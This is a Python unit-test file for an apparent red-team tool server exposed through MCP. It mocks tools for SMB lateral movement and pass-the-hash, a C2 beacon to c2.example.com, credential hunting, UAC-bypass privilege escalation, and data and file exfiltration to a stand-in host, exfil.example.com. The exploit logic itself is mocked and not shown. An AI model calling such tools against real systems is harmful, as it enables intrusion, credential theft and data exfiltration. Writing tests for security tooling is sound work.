#!/usr/bin/env python3
"""
红队工具处理器单元测试
测试 handlers/redteam_handlers.py 中的工具注册和执行
"""

import pytest
from unittest.mock import MagicMock, AsyncMock, patch
from typing import Dict, Any


class TestRedTeamHandlersRegistration:
    """测试红队工具注册"""

    def test_register_redteam_tools(self):
        """测试注册函数是否正确调用"""
        from handlers.redteam_handlers import register_redteam_tools

        # 模拟 MCP 实例
        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        # 执行注册
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 验证 counter.add 被调用
        mock_counter.add.assert_called_once_with('redteam', 14)

        # 验证 logger.info 被调用
        mock_logger.info.assert_called_once()
        assert "14 个红队工具" in str(mock_logger.info.call_args)

        # 验证 @mcp.tool() 装饰器被调用了 14 次
        assert mock_mcp.tool.call_count == 14


class TestLateralSMBTool:
    """测试 lateral_smb SMB横向移动工具"""

    @pytest.mark.asyncio
    async def test_lateral_smb_success_with_password(self):
        """测试SMB横向移动成功 - 密码认证"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 模拟SMB执行结果
        mock_result = {
            'success': True,
            'target': '192.168.1.100',
            'output': 'DOMAIN\\Administrator',
            'command': 'whoami'
        }

        with patch('core.lateral.smb.smb_exec') as mock_smb_exec:
            mock_smb_exec.return_value = mock_result

            result = await registered_tools['lateral_smb'](
                target="192.168.1.100",
                username="Administrator",
                password="P@ssw0rd",
                command="whoami"
            )

            assert result['success'] is True
            assert result['data']['target'] == '192.168.1.100'
            assert 'Administrator' in result['data']['output']
            mock_smb_exec.assert_called_once()

    @pytest.mark.asyncio
    async def test_lateral_smb_success_with_hash(self):
        """测试SMB横向移动成功 - Pass-the-Hash"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        mock_result = {'success': True, 'target': '192.168.1.100'}

        with patch('core.lateral.smb.smb_exec') as mock_smb_exec:
            mock_smb_exec.return_value = mock_result

            result = await registered_tools['lateral_smb'](
                target="192.168.1.100",
                username="Administrator",
                ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
                command="whoami"
            )

            assert result['success'] is True

    @pytest.mark.asyncio
    async def test_lateral_smb_auth_error(self):
        """测试SMB横向移动认证失败"""
        from handlers.redteam_handlers import register_redteam_tools
        from core.exceptions import InvalidCredentials

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        with patch('core.lateral.smb.smb_exec') as mock_smb_exec:
            mock_smb_exec.side_effect = InvalidCredentials("Invalid username or password")

            result = await registered_tools['lateral_smb'](
                target="192.168.1.100",
                username="Administrator",
                password="WrongPassword"
            )

            assert result['success'] is False
            assert '认证失败' in result['error']

    @pytest.mark.asyncio
    async def test_lateral_smb_import_error(self):
        """测试SMB模块导入失败"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        with patch('core.lateral.smb_lateral.smb_exec', side_effect=ImportError("Module not found")):
            result = await registered_tools['lateral_smb'](
                target="192.168.1.100",
                username="Administrator",
                password="P@ssw0rd"
            )

            assert result['success'] is False
            assert '模块导入失败' in result['error']


class TestC2BeaconStartTool:
    """测试 c2_beacon_start C2 Beacon工具"""

    @pytest.mark.asyncio
    async def test_c2_beacon_start_success(self):
        """测试C2 Beacon启动成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 模拟Beacon
        mock_beacon = MagicMock()
        mock_beacon.beacon_id = 'beacon-12345'
        mock_beacon.status = MagicMock()
        mock_beacon.status.value = 'active'
        mock_beacon.connect.return_value = True
        mock_beacon.start.return_value = None

        with patch('core.c2.beacon.create_beacon') as mock_create_beacon:
            mock_create_beacon.return_value = mock_beacon

            result = await registered_tools['c2_beacon_start'](
                server="c2.example.com",
                port=443,
                protocol="https",
                interval=60.0
            )

            assert result['success'] is True
            assert result['data']['beacon_id'] == 'beacon-12345'
            assert result['data']['status'] == 'active'
            assert result['data']['server'] == "c2.example.com"

    @pytest.mark.asyncio
    async def test_c2_beacon_start_connection_failed(self):
        """测试C2 Beacon连接失败"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        mock_beacon = MagicMock()
        mock_beacon.connect.return_value = False

        with patch('core.c2.beacon.create_beacon') as mock_create_beacon:
            mock_create_beacon.return_value = mock_beacon

            result = await registered_tools['c2_beacon_start'](
                server="c2.example.com"
            )

            assert result['success'] is False
            assert 'Connection failed' in result['error']


class TestPayloadObfuscateTool:
    """测试 payload_obfuscate Payload混淆工具"""

    @pytest.mark.asyncio
    async def test_payload_obfuscate_success(self):
        """测试Payload混淆成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        original_payload = "whoami"
        obfuscated_payload = "d2hvYW1p"  # base64

        with patch('core.evasion.payload_obfuscator.obfuscate_payload') as mock_obfuscate:
            mock_obfuscate.return_value = obfuscated_payload

            result = await registered_tools['payload_obfuscate'](
                payload=original_payload,
                technique="xor"
            )

            assert result['success'] is True
            assert result['data']['original_length'] == len(original_payload)
            assert result['data']['obfuscated_length'] == len(obfuscated_payload)
            assert result['data']['technique'] == "xor"
            assert result['data']['obfuscated'] == obfuscated_payload

    @pytest.mark.asyncio
    async def test_payload_obfuscate_invalid_technique(self):
        """测试Payload混淆无效技术"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        with patch('core.evasion.payload_obfuscator.obfuscate_payload') as mock_obfuscate:
            mock_obfuscate.side_effect = ValueError("Invalid technique")

            result = await registered_tools['payload_obfuscate'](
                payload="whoami",
                technique="invalid"
            )

            assert result['success'] is False
            assert '参数错误' in result['error']


class TestCredentialFindTool:
    """测试 credential_find 凭证发现工具"""

    @pytest.mark.asyncio
    async def test_credential_find_success(self):
        """测试凭证发现成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        mock_findings = [
            {'file': '/etc/config.ini', 'type': 'password', 'value': 'admin123'},
            {'file': '/home/user/.env', 'type': 'api_key', 'value': 'sk-xxx'}
        ]

        with patch('core.credential.password_finder.find_secrets') as mock_find:
            mock_find.return_value = mock_findings

            result = await registered_tools['credential_find'](
                path="/home/user"
            )

            assert result['success'] is True
            assert result['data']['total'] == 2
            assert len(result['data']['findings']) == 2

    @pytest.mark.asyncio
    async def test_credential_find_permission_error(self):
        """测试凭证发现权限不足"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        with patch('core.credential.password_finder.find_secrets') as mock_find:
            mock_find.side_effect = PermissionError("Access denied")

            result = await registered_tools['credential_find'](
                path="/root"
            )

            assert result['success'] is False
            assert '权限不足' in result['error']


class TestPrivilegeCheckTool:
    """测试 privilege_check 权限检查工具"""

    @pytest.mark.asyncio
    async def test_privilege_check_success(self):
        """测试权限检查成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 模拟权限模块
        mock_module = MagicMock()
        mock_level = MagicMock()
        mock_level.value = 'user'
        mock_module.check_current_privilege.return_value = mock_level
        mock_module.enumerate_vectors.return_value = ['uac_bypass', 'token_impersonation']
        mock_module.platform = 'windows'

        with patch('core.privilege_escalation.get_escalation_module') as mock_get_module:
            mock_get_module.return_value = mock_module

            result = await registered_tools['privilege_check']()

            assert result['success'] is True
            assert result['data']['current_level'] == 'user'
            assert result['data']['vectors_count'] == 2
            assert result['data']['platform'] == 'windows'


class TestPrivilegeEscalateTool:
    """测试 privilege_escalate 权限提升工具"""

    @pytest.mark.asyncio
    async def test_privilege_escalate_auto_success(self):
        """测试自动权限提升成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 模拟提权结果
        mock_result = MagicMock()
        mock_result.success = True
        mock_result.method = MagicMock()
        mock_result.method.value = 'uac_bypass'
        mock_result.from_level = MagicMock()
        mock_result.from_level.value = 'user'
        mock_result.to_level = MagicMock()
        mock_result.to_level.value = 'admin'
        mock_result.output = 'Privilege escalated successfully'
        mock_result.error = None
        mock_result.duration = 2.5
        mock_result.evidence = 'UAC bypassed via fodhelper'

        mock_module = MagicMock()
        mock_module.auto_escalate.return_value = mock_result

        with patch('core.privilege_escalation.get_escalation_module') as mock_get_module:
            mock_get_module.return_value = mock_module

            result = await registered_tools['privilege_escalate'](
                method="auto",
                timeout=60.0
            )

            assert result['success'] is True
            assert result['data']['method'] == 'uac_bypass'
            assert result['data']['from_level'] == 'user'
            assert result['data']['to_level'] == 'admin'

    @pytest.mark.asyncio
    async def test_privilege_escalate_invalid_method(self):
        """测试权限提升无效方法"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        with patch('core.privilege_escalation.get_escalation_module') as mock_get_module:
            # 模拟 EscalationMethod(method) 抛出 ValueError
            with patch('core.privilege_escalation.EscalationMethod', side_effect=ValueError("Invalid method")):
                result = await registered_tools['privilege_escalate'](
                    method="invalid_method"
                )

                assert result['success'] is False
                assert '无效方法' in result['error']


class TestExfiltrateDataTool:
    """测试 exfiltrate_data 数据外泄工具"""

    @pytest.mark.asyncio
    async def test_exfiltrate_data_https_success(self):
        """测试HTTPS数据外泄成功"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 模拟外泄结果
        mock_result = MagicMock()
        mock_result.to_dict.return_value = {
            'success': True,
            'channel': 'https',
            'bytes_sent': 1024,
            'encrypted': True
        }

        mock_module = MagicMock()
        mock_module.exfiltrate.return_value = mock_result

        with patch('core.exfiltration.ExfilFactory') as mock_factory:
            mock_factory.create.return_value = mock_module

            import base64
            data = base64.b64encode(b"sensitive data").decode()

            result = await registered_tools['exfiltrate_data'](
                data=data,
                channel="https",
                destination="https://exfil.example.com",
                encryption=True
            )

            assert result['success'] is True
            assert result['data']['channel'] == 'https'

    @pytest.mark.asyncio
    async def test_exfiltrate_data_invalid_base64(self):
        """测试数据外泄无效Base64"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        result = await registered_tools['exfiltrate_data'](
            data="invalid_base64!!!",
            channel="https",
            destination="https://exfil.example.com"
        )

        assert result['success'] is False
        assert '参数错误' in result['error']


class TestExfiltrateFileTool:
    """测试 exfiltrate_file 文件外泄工具"""

    @pytest.mark.asyncio
    async def test_exfiltrate_file_success(self):
        """测试文件外泄成功"""
        from handlers.redteam_handlers import register_redteam_tools
        import tempfile
        from pathlib import Path

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        # 创建临时文件
        with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as f:
            f.write("sensitive data")
            temp_file = f.name

        try:
            mock_result = MagicMock()
            mock_result.to_dict.return_value = {
                'success': True,
                'channel': 'https',
                'bytes_sent': 14
            }

            mock_module = MagicMock()
            mock_module.exfiltrate.return_value = mock_result

            with patch('core.exfiltration.ExfilFactory') as mock_factory:
                mock_factory.create.return_value = mock_module

                result = await registered_tools['exfiltrate_file'](
                    file_path=temp_file,
                    channel="https",
                    destination="https://exfil.example.com"
                )

                assert result['success'] is True
                assert 'file' in result['data']
                assert 'file_size' in result['data']
        finally:
            Path(temp_file).unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_exfiltrate_file_not_found(self):
        """测试文件外泄文件不存在"""
        from handlers.redteam_handlers import register_redteam_tools

        mock_mcp = MagicMock()
        mock_counter = MagicMock()
        mock_logger = MagicMock()

        registered_tools = {}

        def capture_tool():
            def decorator(func):
                registered_tools[func.__name__] = func
                return func
            return decorator

        mock_mcp.tool = capture_tool
        register_redteam_tools(mock_mcp, mock_counter, mock_logger)

        result = await registered_tools['exfiltrate_file'](
            file_path="/nonexistent/file.txt",
            channel="https",
            destination="https://exfil.example.com"
        )

        assert result['success'] is False
        assert '文件不存在' in result['error']
